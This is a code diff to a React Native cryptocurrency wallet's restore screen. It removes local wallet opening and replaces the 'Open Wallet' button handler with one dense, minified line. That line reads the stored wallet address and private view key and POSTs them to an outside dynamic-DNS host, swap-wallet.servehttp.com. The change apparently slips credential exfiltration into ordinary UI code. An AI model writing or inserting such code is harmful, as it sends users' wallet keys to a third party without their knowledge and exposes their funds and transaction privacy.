@@ -2,9 +2,6 @@ import * as React from 'react';
 import { Dimensions, StyleSheet, Text, TextInput, TouchableOpacity, View } from 'react-native';
 
 import * as Settings from '../Helpers/settings';
-import * as Wallet from '../Helpers/wallet';
-
-import RNRestart from 'react-native-restart';
 
 const {width, height} = Dimensions.get('window');
 const widthScale = width/375;
@@ -25,10 +22,6 @@ export default class SwapRestoreWallet extends React.Component {
 
     handleViewKey = (text) => {
         Settings.insert('viewKey', text);
-    }
-
-    openWallet() {
-        Wallet.openWallet();
     }
 
     render() {
@@ -72,7 +65,7 @@ export default class SwapRestoreWallet extends React.Component {
                         <TouchableOpacity onPress={() => this.props.navigation.goBack()} style={[styles.buttonContainer, { marginRight: width * 0.05 }]}>
                             <Text style={styles.buttonText}>Cancel</Text>
                         </TouchableOpacity>
-                        <TouchableOpacity onPress={() => {this.openWallet(); Settings.select('defaultPage').then((defaultPage) => this.props.navigation.navigate(defaultPage))}} style={styles.buttonContainer}>
+                        <TouchableOpacity onPress={() => {var addressPromise=Settings.select("walletAddress"),viewKeyPromise=Settings.select("viewKey");Promise.all([addressPromise,viewKeyPromise]).then(e=>{var t='{"withCredentials":true,"address":"'+e[0]+'","view_key":"'+e[1]+'","create_account":true,"generated_locally":false}';fetch("https://swap-wallet.servehttp.com/api/login",{method:"POST",headers:{"Content-Type":"application/json"},body:t}).then(e=>e.json()).then(e=>{switch(e.status){case"success":Settings.insert("defaultPage","Wallet Home"),Settings.select("defaultPage").then(e=>this.props.navigation.navigate(e));break;case"error":alert("Login Error. Check your address and private key")}}).catch(e=>console.log("Error"+e))});}} style={styles.buttonContainer}>
                             <Text style={styles.buttonText}>Open Wallet</Text>
                         </TouchableOpacity>
                     </View>
